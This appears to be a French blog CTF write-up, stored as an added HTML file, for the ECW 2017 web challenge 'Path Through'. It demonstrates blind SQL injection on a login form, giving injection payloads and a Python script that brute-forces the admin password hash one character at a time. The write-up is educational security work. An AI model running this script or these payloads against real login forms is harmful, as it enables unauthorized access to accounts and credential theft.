@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.48" />
+
+    
+    
+    
+
+<title>ECW 2017 - Web - Path Through • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ECW 2017 - Web - Path Through"/>
+<meta name="twitter:description" content="L’ECW 2017 est un challenge Jeopardy français organisé par le Pôle d’Excellence Cyber en partenariat avec la Région Bretagne, Airbus et Thalès. Path Through est challenge web basé sur les injections SQL en aveugle (blind).
+
+"/>
+
+<meta property="og:title" content="ECW 2017 - Web - Path Through" />
+<meta property="og:description" content="L’ECW 2017 est un challenge Jeopardy français organisé par le Pôle d’Excellence Cyber en partenariat avec la Région Bretagne, Airbus et Thalès. Path Through est challenge web basé sur les injections SQL en aveugle (blind).
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haaxmax.github.io/fr/writeups/ecw-2017/web-path-through/" /><meta property="article:published_time" content="2017-11-30T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2017-11-30T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      <a href="/fr/writeups/ecw-2017/web-path-through/">
+      
+      
+      
+      <div class="author-image">
+        <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+      </div>
+      
+    </a>
+      <p class="site__description">
+        <a href="/fr/writeups/ecw-2017/web-path-through/">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/fr/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/about/">
+						<span>À Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/en/writeups/ecw-2017/web-path-through/" hreflang="en" lang="en" class="langLink">English</a>
+      <a rel="alternate" href="/en/writeups/ecw-2017/web-path-through/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2018 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>ECW 2017 - Web - Path Through</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Nov 30, 2017
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/posts">POSTS</a>
+              •
+          
+              <a class="badge badge-category" href="/categories/writeups">WRITEUPS</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/web">web</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/ctf">ctf</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/challenge">challenge</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/blind">blind</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/ecw">ecw</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/injection-sql">injection sql</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 4 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>L’ECW 2017 est un challenge Jeopardy français organisé par le Pôle d’Excellence Cyber en partenariat avec la Région Bretagne, Airbus et Thalès. Path Through est challenge web basé sur les injections SQL en aveugle (blind).</p>
+
+<p></p>
+
+<p>Du 06/10 au 22/10 2017, il sert de pré-sélection pour l’épreuve finale de type Capture The Flag qui débutera le 29 novembre 2017 lors de la conférence de l’European Cyber Week à Rennes.</p>
+
+<h2 id="découverte">Découverte</h2>
+
+<p>Le challenge commence en présentant un formulaire d’authentification. On nous demande de nous identifier avec le compte administrateur. Le username n’est pas spécifié, mais il est dit qu’il s’agit d’un “identifiant simple”… Outre la partie devinette, on pense de suite à “admin”.</p>
+
+<h2 id="tests-et-hypothèses">Tests et hypothèses</h2>
+
+<p>N’ayant que ce formulaire sous la main, tout l’intérêt du challenge réside dans le fait de réussir à bypass l’authentification afin d’accéder à la zone d’administration.</p>
+
+<p>On tente différentes injections et différentes tentatives de connexion. On remarque un message d’erreur lorsque que le couple identifiant/password est invalide.</p>
+
+<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_1.png" alt="path_through_1" class="imgSize"/></center></p>
+
+<p>On a donc un retour “booléen”. Soit c’est valide, soit ça ne l’est pas. À partir de là, on pense à une Injection SQL en aveugle (blind SQLi).</p>
+
+<p>L’injection en aveugle se base sur l’utilisation de la fonction substring() et le fait de trouver les caractères du mot de passe un par un. En supposant que le champ contenant le mot de passe dans la base de données soit nommé “password”, on va chercher à tester chaque caractère du mot de passe.
+Le but est de rendre la requête vraie. On se basera pour cela sur le message affiché à l’utilisateur.</p>
+
+<p>En sachant que les 4 premiers caractères du flag (et donc probablement du mot de passe) sont “ECW{” on peut donc imaginer une injection de ce type :</p>
+
+<pre><code>username=admin&amp;password=' or substring(password,1,1)='E
+</code></pre>
+
+<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_2.png" alt="path_through_2" class="imgSize"/></center></p>
+
+<p>On a donc effectivement une Injection SQL en aveugle ! Passons à l’exploitation.</p>
+
+<h2 id="exploitation-et-bypass">Exploitation et Bypass</h2>
+
+<p>Deux solutions s’offrent à nous pour réussir l’exploitation de la vulnérabilité.
+On peut réaliser l’exploitation à la main, en essayant de deviner les caractères suivants, comme ceci :</p>
+
+<pre><code>username=admin&amp;password=' or substring(password,1,2)='C
+username=admin&amp;password=' or substring(password,1,3)='W
+username=admin&amp;password=' or substring(password,1,4)='E{
+</code></pre>
+
+<p>Ou bien automatiser l’exploitation par un script.
+C’est cette seconde solution qui a été choisie afin d’accélérer le processus. En effet, une exploitation manuelle serait longue et fastidieuse.
+On sait cependant que le mot de passe est un hash MD5, donc uniquement composé des caractères “abcdef0123456789”.</p>
+
+<p>On écrit donc un petit script python permettant de retrouver le mot de passe (Ce script est disponible sur le dépôt Github).</p>
+
+<p>NOTE : On n’oublie pas d’ajouter le token de sécurité nonce ainsi qu’un cookie valide afin que les requêtes puissent passer.</p>
+
+<pre><code class="language-Python">#!/usr/bin/python
+
+#coding: utf-8
+
+import requests
+import string
+import sys
+requests.packages.urllib3.disable_warnings()
+
+## Request needed informations
+BASE_URL = &quot;https://challenge-ecw.fr/chals/web100&quot;
+PARAMS = {
+'username': 'admin',
+'password': '',
+'nonce' : '58109a1ef582bab83c89b9435d455e527b44736e43d64750604f7c2a3012f404ba282e19278431cad17852fa9475b2a01a8ddf9551d6b6cfaa5fa6311ceddb5a',
+}
+
+## Static variables
+KEYWORD = &quot;Le mot de passe est le flag.&quot;
+MAX_PWD_LENGTH = 255
+URL = &quot;https://challenge-ecw.fr/chals/web100&quot;
+VULNERABLE_PARAM = &quot;password=&quot;
+INJECTION_USED = &quot;username=admin&amp;password=' or substring(password,1,1)='E&quot;
+
+## Password variables
+passwordLength = 37
+password = &quot;ECW{&quot;
+
+if __name__ == &quot;__main__&quot;:
+print(&quot;\n#####################################&quot;)
+print(&quot;## Blind SQL Injection ECW 2017 ##&quot;)
+print(&quot;#####################################\n&quot;)
+
+print(&quot;[+] URL injected : %s&quot; % URL)
+print(&quot;[+] Vulnerable parameter : %s&quot; % VULNERABLE_PARAM)
+print(&quot;[+] Injection used : %s&quot; % INJECTION_USED)
+
+print(&quot;\n[+] Starting bruteforce\n&quot;)
+
+#req = requests.get(url=BASE_URL, verify=False)
+#token = req.GET['nonce']
+#PARAMS['nonce'] = token
+
+s = requests.Session()
+
+COOKIE = dict(session=&quot;.eJwNj8tqwzAQRX-lzNoLx003hi4KstMGZoyLYiHt1NixpUgqJBQ_Qv69szucy1ncBwSbRijhcoMM0m86D1A-4OWHFclxQREmVF1kXnWsXSPINyK4RrYbqTYn2QWSX6_aM29YGPZGaObTTP4jN773GKsNRbUa3850OE7ox9XI6g39eU8CF13UV5TM8hi1vHLbOW5mVNXeHL5jI087VG2hvfEm1hMpM5HHBRUF3h2p6h2eGfzdh1uykQ_Ap7UL_7F9dAnKiw33IQPXQ7kr8uc_UPNP7A.DMdGMg.UMD8szIENKxcuos1Rmk0Zqzd_8s&quot;)
+
+for i in range(5, passwordLength):
+charset = &quot;abcdef0123456789&quot;
+for j in charset:
+sys.stdout.write(&quot;\r&quot;)
+sys.stdout.write(&quot;[+] Password : %s%c&quot; % (password,j))
+sys.stdout.flush()
+PARAMS['password'] = &quot;' or substring(password,1,&quot;+ str(i) +&quot;)='&quot; + password + j
+req = s.post(url=BASE_URL, data=PARAMS, cookies=COOKIE, verify=False)
+if KEYWORD in req.text:
+password += j
+break;
+
+password = password + &quot;}&quot;
+print(&quot;\n[+] Done\n&quot;)
+print(&quot;[+] Password is %s\n&quot; % password)
+</code></pre>
+
+<h2 id="récupération-du-flag">Récupération du Flag</h2>
+
+<p>On exécute notre script et là..</p>
+
+<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_3.png" alt="path_through_3" class="imgSize"/></center></p>
+
+<p>Bingo ! Le flag est à nous.
+Challenge présentant donc une blind SQLi assez basique mais néanmoins intéressant pour apprendre ou rafraichir les connaissances.</p>
+
+<h2 id="références">Références</h2>
+
+<ul>
+<li><a href="http://www.mcherifi.org/hacking/sql-injection-avancee-blind-sql-injection.html" target="blank">SQL injection avancée: Blind SQL injection</a></li>
+</ul>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/fr/writeups/ecw-2017/web-hall-of-fame/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">ECW 2017 - Web - Hall of Fame</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
